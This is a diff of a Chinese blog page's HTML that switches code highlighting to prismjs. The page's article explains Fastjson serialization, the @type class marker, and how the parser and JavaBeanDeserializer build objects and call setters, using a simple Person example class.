@@ -17,7 +17,7 @@
   localSearch: undefined,
   translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
   noticeOutdate: undefined,
-  highlight: undefined,
+  highlight: {"plugin":"prismjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
   copy: {
     success: '复制成功',
     error: '复制错误',
@@ -208,98 +208,93 @@ if (true) {
 <h3 id="1x01-javabean-json"><a href="#1x01-javabean-json" class="headerlink" title="1x01 javabean-&gt;json"></a>1x01 javabean-&gt;json</h3><p>这里最常用的方法就是<code>JSON.toJSONString()</code>,该方法有很多重载方法，并且都带有不同的参数，最常用的是下面几个：<br>序列化特性：<code>com.alibaba.fastjson.serializer.SerializerFeature</code>，这个特性可以放到 <code>fastjsonconfig </code>中供全局使用，又或者直接在方法中指定使用，比如<code>JSON.toJSONString</code>中指定，就可以实现指定序列化类型，使序列化数据自带<code>@type</code>标记</p>
 <p>序列化过滤器：<code>com.alibaba.fastjson.serializer.SerializeFilter</code>，它是一个接口，功能就和名字一样，可以通过配置它的子接口或者实现类的内容，实现扩展编程，也就是额外执行一些代码操作<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710339183511-ad04a090-0432-46d7-b6ac-b3b8c2fabe5a.png#averageHue=%23576957&clientId=u945d9825-8c54-4&from=paste&height=310&id=ucec0051d&originHeight=465&originWidth=1819&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=260974&status=done&style=none&taskId=uc5d44dec-2ca5-4061-8cf1-9679983013d&title=&width=1212.6666666666667" referrerpolicy="no-referrer" alt="image.png"></p>
 <p>序列化配置：<code>com.alibaba.fastjson.serializer.SerializeConfig</code>，可自定义的序列化配置类，之后调试会遇到<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710339326854-124703c8-d984-43c7-bb94-164718bb18b5.png#averageHue=%23333a41&clientId=u945d9825-8c54-4&from=paste&height=406&id=u7ab81456&originHeight=609&originWidth=1251&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=348293&status=done&style=none&taskId=u408d112d-e96f-4a50-b06e-b0fc73860fc&title=&width=834" referrerpolicy="no-referrer" alt="image.png"><br>那么具体使用如下</p>
-<pre><code class="java">import com.alibaba.fastjson.JSON;
-import com.alibaba.fastjson.JSONObject;
-import com.alibaba.fastjson.serializer.SerializerFeature;
-import sun.rmi.runtime.NewThreadAction;
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSONObject</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializerFeature</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">sun<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">NewThreadAction</span></span><span class="token punctuation">;</span>
 
-public class Test &#123;
-    public static void main(String[] args) &#123;
-        Person person=new Person();
-        person.setAge(20);
-        person.setName(&quot;stoocea&quot;);
-        String personjson= JSON.toJSONString(person, SerializerFeature.WriteClassName);
-        System.out.println(personjson);
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">Person</span> person<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        person<span class="token punctuation">.</span><span class="token function">setAge</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        person<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"stoocea"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">String</span> personjson<span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>person<span class="token punctuation">,</span> <span class="token class-name">SerializerFeature<span class="token punctuation">.</span>WriteClassName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>personjson<span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-        Object o1 =  JSON.parse(personjson);  //解析为JSONObject类型或者JSONArray类型
+        <span class="token class-name">Object</span> o1 <span class="token operator">=</span>  <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>personjson<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//解析为JSONObject类型或者JSONArray类型</span>
 
-    &#125;
-&#125;
-</code></pre>
-<pre><code class="java">public class Person &#123;
-    private String name;
-    private int age;
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>
 
-    public String getName() &#123;
-        System.out.println(&quot;调用了Name的getter&quot;);
-        return name;
-    &#125;
+    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"调用了Name的getter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> name<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
 
-    public void setName(String name) &#123;
-        System.out.println(&quot;调用了Name的setter&quot;);
-        this.name = name;
-    &#125;
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"调用了Name的setter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
 
-    public int getAge() &#123;
-        System.out.println(&quot;调用了Age的getter&quot;);
-        return age;
-    &#125;
+    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"调用了Age的getter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> age<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
 
-    public void setAge(int age) &#123;
-        System.out.println(&quot;调用了Age的setter&quot;);
-        this.age = age;
-    &#125;
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"调用了Age的setter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
 
-    public Person() &#123;
-        System.out.println(&quot;调用了无参构造&quot;);
-    &#125;
+    <span class="token keyword">public</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"调用了无参构造"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
 
-    public Person(String name, int age) &#123;
-        System.out.println(&quot;调用了有参构造&quot;);
-        this.name = name;
-        this.age = age;
-    &#125;
+    <span class="token keyword">public</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"调用了有参构造"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
 
-    @Override
-    public String toString() &#123;
-        return &quot;Person&#123;&quot; +
-                &quot;name=&#39;&quot; + name + &#39;\&#39;&#39; +
-                &quot;, age=&quot; + age +
-                &#39;&#125;&#39;;
-    &#125;
-&#125;
-</code></pre>
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token string">"Person&#123;"</span> <span class="token operator">+</span>
+                <span class="token string">"name='"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token char">'\''</span> <span class="token operator">+</span>
+                <span class="token string">", age="</span> <span class="token operator">+</span> age <span class="token operator">+</span>
+                <span class="token char">'&#125;'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710339675557-3f57be73-06de-4555-8176-3b47885f8fcc.png#averageHue=%233a3e46&clientId=u945d9825-8c54-4&from=paste&height=210&id=u52b6c195&originHeight=315&originWidth=847&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=80930&status=done&style=none&taskId=u11ce3a83-ac4f-4097-bd00-a0f4008d024&title=&width=564.6666666666666" referrerpolicy="no-referrer" alt="image.png"></p>
 <h3 id="1x02-json-javabean"><a href="#1x02-json-javabean" class="headerlink" title="1x02 json-&gt;javabean"></a>1x02 json-&gt;javabean</h3><p>fastjson 中将 json 数据反序列化成 javabean 类的常用方法为<code>parse()``parseObject()``parseArray()</code>，这三个方法也同样拥有很多的重载方法，带有不同的参数（具体可以去类的具体定义中查看）:<br>反序列化特性： <code>com.alibaba.fastjson.parser.Feature</code><br>类的特性 <code>java.lang.reflect.Type</code><br>处理泛型反序列化：<code>com.alibaba.fastjson.TypeReference</code><br>编程扩展定制反序列化：<code>com.alibaba.fastjson.parser.deserializer.ParseProcess</code>，例如<code>ExtraProcessor</code> 用于处理多余的字段，<code>ExtraTypeProvider</code> 用于处理多余字段时提供类型信息<br>还是与序列化有所不同的，但是有些很常见以及必须要实现的特性和配置还是相同的，fastjson 中的反序列化组件中的属性就很符合其反序列化的功能所要求的，类型宽泛<br>有一张关于 FastJson 早期的框架图：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710342282453-1d17b97d-430b-4c34-b1d7-801ca9ce21b7.png#averageHue=%237c7c7c&clientId=u945d9825-8c54-4&from=paste&height=363&id=u627fa2de&originHeight=544&originWidth=906&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=118937&status=done&style=none&taskId=u1b136b5e-440a-4957-85aa-cfc130e1b26&title=&width=604" referrerpolicy="no-referrer" alt="1616458393831.png"><br>之后流程调试的时候会遇到这些常见组件</p>
 <h3 id="1x03-常见特性"><a href="#1x03-常见特性" class="headerlink" title="1x03 常见特性"></a>1x03 常见特性</h3><p>相信看完上面的使用例应该有不少疑问，比说为什么序列化结果会有 <code>@type</code>等<br>这里我们将会用实例一个一个解决<br>1.为什么序列化结果出现了<code>@type</code>的字样，假如我们不加反序列化标识<code>SerializerFeature</code></p>
-<pre><code class="java">import com.alibaba.fastjson.JSON;
-import com.alibaba.fastjson.serializer.SerializerFeature;
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializerFeature</span></span><span class="token punctuation">;</span>
 
-public class Test2 &#123;
-    public static void main(String[] args) &#123;
-        Person person=new Person();
-        person.setName(&quot;stoocea&quot;);
-        person.setAge(20);
-        String personString= JSON.toJSONString(person);
-        System.out.println(personString);
-         //JSON.parseObject(personString);
-    &#125;
-&#125;
-</code></pre>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test2</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">Person</span> person<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        person<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"stoocea"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        person<span class="token punctuation">.</span><span class="token function">setAge</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">String</span> personString<span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>person<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>personString<span class="token punctuation">)</span><span class="token punctuation">;</span>
+         <span class="token comment">//JSON.parseObject(personString);</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>结果如下<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710384953668-6d29619d-97a6-400b-8803-b2f7a089c6d5.png#averageHue=%233d4048&clientId=ud4e25145-d315-4&from=paste&height=44&id=u4cf7fece&originHeight=66&originWidth=557&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=13993&status=done&style=none&taskId=u9c43ecd1-2041-4165-aa4b-6fc6aa78df7&title=&width=371.3333333333333" referrerpolicy="no-referrer" alt="image.png"><br>就没有<code>@type</code>标识符了，然后我们再尝试不指定类型，直接解析序列化数据</p>
-<pre><code class="java">String personString= JSON.toJSONString(person);
-System.out.println(personString);
-JSONObject person1=JSON.parseObject(personString);
-System.out.println(person1);
-</code></pre>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> personString<span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>person<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>personString<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">JSONObject</span> person1<span class="token operator">=</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>personString<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>person1<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710385328620-3bf107fa-c564-4498-b046-f70d88f30f51.png#averageHue=%233e414a&clientId=ud4e25145-d315-4&from=paste&height=71&id=u559dc735&originHeight=107&originWidth=504&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=23846&status=done&style=none&taskId=u9c2bbcce-c0f1-4f7f-9b85-6668e3f9f02&title=&width=336" referrerpolicy="no-referrer" alt="image.png"><br>最后的打印输出并不是我们想要的 person 类的 toString 方法，而是 JSONObject 的 toString 方法，也就是说我们现在得到的并不是想要的 Person 类，并且无法被强转<br>那我们想要得到指定类的方法就是加上<code>@type</code>指定标识的类或者直接在 parseObject 方法中加上该类的全类名的参数即可，这里我们只演示如何通过<code>@type</code>来指定类型<br>有两种方法：<br>1 序列化的时候加序列化标识<code>SerializerFeature.WriteClassName</code></p>
-<pre><code class="java">String personString= JSON.toJSONString(person,SerializerFeature.WriteClassName);
-System.out.println(personString);
-</code></pre>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> personString<span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>person<span class="token punctuation">,</span><span class="token class-name">SerializerFeature<span class="token punctuation">.</span>WriteClassName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>personString<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710385599600-3b05e3f9-1e72-4365-9a1a-c86bc67d99d2.png#averageHue=%233d4049&clientId=ud4e25145-d315-4&from=paste&height=48&id=u992ef72d&originHeight=72&originWidth=760&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=20169&status=done&style=none&taskId=ucc404d6f-1e41-4176-92d4-eb2c9e4f329&title=&width=506.6666666666667" referrerpolicy="no-referrer" alt="image.png"></p>
-<pre><code class="java">Object person1= JSON.parse(personString);
-System.out.println(person1);
-</code></pre>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Object</span> person1<span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>personString<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>person1<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710385616584-7f9462a8-4015-4480-99c8-7d31cf8aa49c.png#averageHue=%233f424a&clientId=ud4e25145-d315-4&from=paste&height=39&id=u3050d408&originHeight=58&originWidth=553&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=14301&status=done&style=none&taskId=u6bb87834-821c-484d-bdfe-782255c5fcc&title=&width=368.6666666666667" referrerpolicy="no-referrer" alt="image.png"></p>
 <p>2 自己手动加，这里就不演示了</p>
 <h3 id="1x04-Fastjson-工作流程分析"><a href="#1x04-Fastjson-工作流程分析" class="headerlink" title="1x04 Fastjson 工作流程分析"></a>1x04 Fastjson 工作流程分析</h3><h4 id="2x01-选定解析器-DefaultJSONParser"><a href="#2x01-选定解析器-DefaultJSONParser" class="headerlink" title="2x01 选定解析器-DefaultJSONParser"></a>2x01 选定解析器-DefaultJSONParser</h4><p>断点我们打在测试类的 parseObject 方法处<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710384335528-1f5456c7-5756-4908-99a7-86d1991e5d8d.png#averageHue=%233d454d&clientId=ud4e25145-d315-4&from=paste&height=341&id=u74151a6f&originHeight=512&originWidth=1553&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=312505&status=done&style=none&taskId=u19a25aa3-2ed5-4b2b-8d21-fcdff24ddee&title=&width=1035.3333333333333" referrerpolicy="no-referrer" alt="image.png"><br>然后跟进<br>这里发现其实 parseObject 对于 parse 只是一层强转封装，最终调用的还是 parse<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710384349205-8f1c1503-e058-4068-bc3f-a77d7e4a3c09.png#averageHue=%233b444d&clientId=ud4e25145-d315-4&from=paste&height=268&id=uc74e0714&originHeight=402&originWidth=1454&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=219290&status=done&style=none&taskId=ue9225a1a-1e1b-415e-bc94-cb2fcdddfb5&title=&width=969.3333333333334" referrerpolicy="no-referrer" alt="image.png"><br>所以继续跟进 parse<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710384430301-93c935ee-5449-4ad3-9906-7d82f0b7b49e.png#averageHue=%233c434a&clientId=ud4e25145-d315-4&from=paste&height=453&id=u80264a05&originHeight=680&originWidth=1567&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=354947&status=done&style=none&taskId=u1f9895b2-6d7b-42b5-a065-0f29cf37765&title=&width=1044.6666666666667" referrerpolicy="no-referrer" alt="image.png"><br>内容主要是获取到 JSONParser 解析器，然后调用解析器的 parse 方法去解析，这里的 DefaultJSONParser 感兴趣的师傅可以自己调一下，我这里只给出 Parser 实例化完成之后里面需要注意的点<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710384606933-ed45fa2a-37d4-47f8-90ef-1844f9739a78.png#averageHue=%2331373e&clientId=ud4e25145-d315-4&from=paste&height=701&id=uf094493f&originHeight=1052&originWidth=1189&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=643176&status=done&style=none&taskId=u5295ab3f-6dd4-48ef-8640-01542ae8417&title=&width=792.6666666666666" referrerpolicy="no-referrer" alt="image.png"><br>大致信息如下：</p>
@@ -321,222 +316,213 @@ System.out.println(person1);
 <h4 id="2x03-deserialze-解析—javaBeanDeserializer"><a href="#2x03-deserialze-解析—javaBeanDeserializer" class="headerlink" title="2x03 deserialze 解析—javaBeanDeserializer"></a>2x03 deserialze 解析—javaBeanDeserializer</h4><p>经过几层包装特性，跟进到了 javaBeanDeserializer 的 deserialze 方法，前面是对 JSON 数据做处理，我们跟进到重点 for 循环，关于 fieldInfo 的遍历<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710732011257-b66be996-3e4c-4128-a1ad-0ca2f7764790.png#averageHue=%23363d46&clientId=uc6fd9fb4-b99e-4&from=paste&height=629&id=uf5021c0d&originHeight=1038&originWidth=2473&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=1077492&status=done&style=none&taskId=u76d65448-81b9-4af5-98fe-9bd16c100a5&title=&width=1498.7877921602774" referrerpolicy="no-referrer" alt="image.png"><br>for 循环前面是对 fieldinfo 中获取到的字段属性以及 getset 方法等进行类型判断和特殊情况的判断，当来到 createInstance 方法，它首先是实例化了一个 Person 的空类，里面的属性值都为默认<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710732487683-11d8bd1d-859f-4858-97fd-8d030dbc1f1d.png#averageHue=%233a3f49&clientId=uc6fd9fb4-b99e-4&from=paste&height=633&id=ua5ea5382&originHeight=1045&originWidth=2556&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=927002&status=done&style=none&taskId=u7a05839c-2db1-4f1a-b1e4-c5e816bad45&title=&width=1549.090819555871" referrerpolicy="no-referrer" alt="image.png"><br>后续会调用 FieldDeserializer 的 setVlue 方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710732599865-8f1a78ad-ff02-43b2-8cc5-da0bd1d39902.png#averageHue=%233a404a&clientId=uc6fd9fb4-b99e-4&from=paste&height=730&id=u25dd7551&originHeight=1204&originWidth=2130&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=1010006&status=done&style=none&taskId=ub9e1247a-8acd-4b94-868c-ac975788191&title=&width=1290.9090162965592" referrerpolicy="no-referrer" alt="image.png"><br>具体内容的话就是反射调用 set 方法了<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" 